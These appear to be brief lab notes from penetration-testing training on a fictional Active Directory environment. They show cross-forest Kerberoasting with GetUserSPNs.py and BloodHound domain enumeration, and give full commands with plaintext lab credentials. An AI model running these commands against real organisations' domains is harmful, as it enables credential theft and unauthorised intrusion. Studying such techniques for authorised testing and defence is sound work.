## Cross-Forest Kerberoasting

#### Using GetUserSPNs.py

```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

We must add domain to /etc/resolv.conf file.

```
domain INLANEFREIGHT.LOCAL
```


## Running bloodhound-python Against INLANEFREIGHT.LOCAL

```
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2 --zip
```

We must add domain to /etc/resolv.conf file.
```
domain FREIGHTLOGISTICS.LOCAL
```


### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL

```
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2 --zip
```


